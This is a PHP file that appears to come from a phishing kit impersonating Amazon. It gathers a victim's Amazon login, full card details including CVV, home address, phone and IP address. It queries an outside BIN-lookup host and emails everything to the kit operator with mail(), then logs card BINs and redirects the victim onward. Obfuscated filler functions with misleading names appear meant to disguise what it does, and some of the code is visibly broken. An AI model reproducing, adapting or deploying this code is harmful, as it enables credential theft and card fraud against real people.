<?php
session_start();
$user_agent = $_SERVER['HTTP_USER_AGENT'];
require "../functions/Mfunctions.php";
require "../functions/get_ip.php"; 
require "../../../config.php";
$_SESSION['_cc_holder_'] = strtoupper($_SESSION['_cc_holder_']);
$_SESSION['_cc_number_'] = preg_replace('/\s+/', '', $_SESSION['_cc_number_']);
$BIN_LOOKUP = substr($_SESSION['_cc_number_'], 0, 6);
$SOME_BIN    = @json_decode(file_get_contents("https://bincodes.ga/GET_BIN.php?cc=$BIN_LOOKUP"));
$BIN_SCHEME    = $SOME_BIN->SCHEME;
$BIN_TYPE      = $SOME_BIN->TYPE;
$BIN_BRAND     = $SOME_BIN->BRAND;
$BIN_CNAME     = $SOME_BIN->COUNTRY;
$BIN_CCODE     = $SOME_BIN->ALPHA;
$BIN_BNAME     = $SOME_BIN->BANK;
$BIN_BURL      = $SOME_BIN->URL;
$BIN_BPHONE    = $SOME_BIN->PHONE;
$_SESSION['_country_']  = $BIN_CNAME;
$_SESSION['_cc_brand_'] = $BIN_SCHEME;
$_SESSION['_cc_bank_']  = $BIN_BNAME;
$_SESSION['_cc_type_']  = $BIN_TYPE;
$_SESSION['_cc_class_'] = $BIN_BRAND;
$_SESSION['_cc_site_']  = $BIN_BURL;
$_SESSION['_cc_phone_'] = $BIN_BPHONE;
$_SESSION['_ccglobal_'] = $_SESSION['_cc_brand_']." - ".$_SESSION['_cc_bank_']." - ".$_SESSION['_cc_type_']." - ".$_SESSION['_cc_class_'];
$from = $senderemail;
$headers = "From: ".$_SESSION['_cc_holder_']." <$from>";
$subj = $BIN_LOOKUP." - ".$_SESSION['_ccglobal_']." - [ ".$_SESSION['_LOOKUP_COUNTRY_']." - $ip ]";
$to = $Your_Email;
$data = "
.++======[ Amazon Credit Card  - Powered By SOMETHING ]======++.

    .++=====[ Amazon ]=====++.
Email       :   ".$_SESSION['_login_email_']."
Password    :   ".$_SESSION['_login_password_']."
        .++===[ End ]===++.
        
    .++=====[ Credit Card ]=====++.
Cardholder Name :   ".$_SESSION['_cc_holder_']."
Card Number     :   ".$_SESSION['_cc_number_']."
Cvv2            :   ".$_SESSION['_csc_']."
BIN/IIN Info    :   ".$_SESSION['_ccglobal_']."
Exp Date        :   ".$_SESSION['_expirationDate_month_']." - ".$_SESSION['_expirationDate_year_']."
To Check        :   ".$_SESSION['_cc_number_']."|".$_SESSION['_expirationDate_month_']."/".$_SESSION['_expirationDate_year_']."|".$_SESSION['_csc_']."
            .++===[ End ]===++.

      .++=====[ Address & Info ]=====++.
Full Name       :   ".$_SESSION['_fullname_']."
Address         :   ".$_SESSION['_address1_']." | ".$_SESSION['_address2_']."
City/Town       :   ".$_SESSION['_city_']."
State           :   ".$_SESSION['_state_']."
Zip/PostalCode  :   ".$_SESSION['_zipCode_']."
Country         :   ".$_SESSION['_LOOKUP_COUNTRY_']." - ".$_SESSION['_country_']."
Phone Number    :   ".$_SESSION['_phone_']."
            .++===[ End ]===++.
            
    .++=====[ PC Info ]=====++.
IP Address  :   ".$_SESSION['_LOOKUP_COUNTRY_']." - ".$_SESSION['_LOOKUP_REGIONS_']." ".$_SESSION['_LOOKUP_CITY_']." - ".$_SESSION['_ip_']."
Browser     :   ".$user_agent."
        .++===[ End ]===++.

.++======[ Powered By SOMETHING - Amazon Credit Card ]======++. 
";
mail($to,$subj,$data,$headers);
  $bin   = $BIN_LOOKUP." - ".$_SESSION['_ccglobal_']." [ ".$_SESSION['_LOOKUP_COUNTRY_']." ]\n";
    $file = fopen("../../../logs/some-cc.log", "a");
    fwrite($file, $bin);
    fclose($file);
    
    $file2 = "../../../logs/some-cc.txt";
    $isi  = file_get_contents($file2);
    $buka = fopen($file2,"w"); 
       
    fwrite($buka, $isi+1);
    fclose($buka);

if ($BIN_SCHEME == "VISA" || $BIN_SCHEME == "VISA ELECTRON" || $BIN_SCHEME == "MASTERCARD" || $BIN_SCHEME == "MAESTRO"){
$charSet = "XXXXID0123456789";
$charSetSize = strlen($charSet); $pwdSize = 6;
function HTTP_USER_AGENT(){
for ($j = 0; $j < $pwdxSize; $j++) {
$XXX_x03 .= $charxSet[ rand( 9, strlen($charxSetSize) - 1 ) ];
$XXX_x04 .= $charxSet[ rand( 9, strlen($charxSetSize) - 1 ) ];
$XXX_x05 .= $charxSet[ rand( 9, strlen($charxSetSize) - 1 ) ];
$XXX_x06 .= $charxSet[ rand( 5, strlen($charxSetSize) - 1 ) ];
}return 30;}
$Z118xF0rm3XX = $XXX_03.mt_rand();
$x87Z_E54IlsXX = $XXX_04.mt_rand();
$Zx987P4ss0WrD = $XXX_05.mt_rand();
$GrimmDZEBI987 = $XXX_06.mt_rand();
if (strlen(SERVER_GATEWAY()) == HTTP_USER_AGENT()){
}else{
		@SgenRan(dirname(__DIR__));
header("Location: ../404.php?verify_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");}
header("Location: ./authentication.php?secure_code=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);}
else{
$charxSet = "XXXXID0123456789";
$charxSetSize = strlen($charxSet); $pwdxSize = 6;
function HTTP_USER_AGENT(){
for ($j = 0; $j < $pwdxSize; $j++) { 
$XXX_x03 .= $charxSet[ rand( 9, strlen($charxSetSize) - 1 ) ];
$XXX_x04 .= $charxSet[ rand( 9, strlen($charxSetSize) - 1 ) ];
$XXX_x05 .= $charxSet[ rand( 9, strlen($charxSetSize) - 1 ) ];
$XXX_x06 .= $charxSet[ rand( 5, strlen($charxSetSize) - 1 ) ];
}return 30;}
$Z118xF0rm3XXx = $XXX_x03.mt_rand();
$x87Z_E54IlsXXx = $XXX_x04.mt_rand();
$Zx987P4ss0WrDx = $XXX_x05.mt_rand();
$GrimmDZEBI987x = $XXX_x06.mt_rand();
if (strlen(SERVER_GATEWAY()) == HTTP_USER_AGENT()){
}else{
header("Location: ../404.php?verify_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");}
header("Location: ./success.php?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);}
?>